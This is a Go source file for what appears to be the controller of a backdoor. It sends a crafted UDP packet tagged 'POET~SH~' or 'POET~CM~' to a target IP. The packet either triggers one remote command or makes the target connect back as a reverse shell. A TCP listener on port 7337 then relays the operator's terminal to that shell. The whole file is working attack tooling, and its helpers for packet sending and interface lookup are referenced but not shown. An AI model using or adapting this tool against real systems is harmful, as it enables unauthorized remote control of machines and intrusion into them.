package main

import (
	"embed"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"sync"
)

const DEFIP = "127.0.0.2"

//go:embed art.txt
var f embed.FS

func tcp_con_handle(con net.Conn) {
	chan_to_stdout := stream_copy(con, os.Stdout)
	chan_to_remote := stream_copy(os.Stdin, con)
	select {
	case <-chan_to_stdout:
		log.Println("Remote connection is closed")
	case <-chan_to_remote:
		log.Println("Local program is terminated")
	}
}

// Performs copy operation between streams: os and tcp streams
func stream_copy(src io.Reader, dst io.Writer) <-chan int {
	buf := make([]byte, 1024)
	sync_channel := make(chan int)
	go func() {
		defer func() {
			if con, ok := dst.(net.Conn); ok {
				con.Close()
				log.Printf("Connection from %v is closed\n", con.RemoteAddr())
			}
			sync_channel <- 0 // Notify that processing is finished
		}()
		for {
			var nBytes int
			var err error
			nBytes, err = src.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Printf("Read error: %s\n", err)
				}
				break
			}
			_, err = dst.Write(buf[0:nBytes])
			if err != nil {
				log.Fatalf("Write error: %s\n", err)
			}
		}
	}()
	return sync_channel
}

func shell_listen(source string, wg *sync.WaitGroup) {
	defer wg.Done()
	listener, err := net.Listen("tcp", source+":7337")
	if err != nil {
		log.Fatalln(err)
	}

	con, err := listener.Accept()
	if err != nil {
		log.Fatalln(err)
	}

	b, err := f.ReadFile("art.txt")
	if err != nil {
		panic(err)
	}
	fmt.Println(string(b)) // ascii art ;)

	log.Println("Connected: ", con.RemoteAddr())

	tcp_con_handle(con)
}

func main() {
	var iFace string
	var source string
	var target string
	var recv string
	var command string
	var shell bool

	// export IFACE=<interface>
	iFace, ok := os.LookupEnv("IFACE")
	if !ok {
		fmt.Printf("IFACE environment variable not set\n")
		return
	}

	flag.StringVar(&target, "t", DEFIP, "Required: IP address to target")
	flag.StringVar(&recv, "r", DEFIP, "Optional: Where to send the shell. Defaults to interface IP if not specified.")
	flag.StringVar(&command, "c", "NONE", "Choice: Single command to run through UDP. No output")
	flag.BoolVar(&shell, "s", false, "Choice: Spawn and connect to reverse shell")

	flag.Parse()

	if target == DEFIP {
		flag.Usage()
		return
	}

	source, err := GetInterfaceIpv4Addr(iFace)
	if err != nil {
		panic(err)
	}

	if recv == DEFIP {
		recv = source
	}

	var opener string
	wg := new(sync.WaitGroup)
	if shell {
		opener = "POET~SH~" + recv
		wg.Add(1)
		go shell_listen(source, wg) // listen in background
	} else if command == "NONE" {
		flag.Usage()
		return
	} else {
		opener = "POET~CM~" + command
	}

	fmt.Printf("Sending to %s: %s\n", target, opener)
	sendUDPPacket(iFace, source, target, opener, 77, 7714)

	wg.Wait()
}
